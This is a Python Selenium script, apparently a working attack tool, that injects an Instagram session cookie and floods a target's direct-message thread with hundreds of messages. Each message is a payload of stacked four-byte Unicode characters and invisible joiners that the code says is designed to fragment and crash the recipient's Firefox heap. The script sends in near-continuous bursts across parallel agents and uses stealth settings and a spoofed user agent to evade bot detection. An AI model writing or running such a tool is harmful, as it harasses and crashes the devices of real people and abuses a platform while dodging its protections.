# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (FIREFOX-KILLER V48)
# 📅 STATUS: HEAP-SATURATION | 4-AGENT TOTAL | AWS-HARD-CRASH

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.1)   # 🔥 Maximum Velocity
REST_AFTER_STRIKES = 150   
REST_DURATION = 2          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_firefox_killer_payload():
    """Generates a high-byte surrogate payload to fragment the browser heap."""
    u_id = random.randint(100, 999)
    # 𒀱 = Cuneiform (4 bytes) | 🌙 = Moon (4 bytes) | 𝕻 = Fraktur (4 bytes)
    # Mixing these prevents Firefox's 'String Deduplication'
    heavy = ["𒀱", "🌙", "𝕻", "𝙰"]
    glue = "\u2060" # Word Joiner (Invisible)
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HEAP_LOCK:{u_id}]"
    
    body = []
    # 400 lines of unique, high-byte memory allocations
    for i in range(400):
        random.shuffle(heavy)
        # We bond high-byte chars to ensure Firefox can't compress the string
        line = f"PRAVEER PAPA ON TOP 🌙 {''.join(heavy * 6)} {i}{glue*8}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu") # Keep YOUR bot light
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_send(driver, text):
    """Bypasses UI lag by forcing a direct DOM 'Enter' event."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('insertText', false, arguments[0]);
                // Fire Native Input Event for Instagram State
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // Fire Enter Key
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_firefox_killer_payload()
                if atomic_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Heap-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 80 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
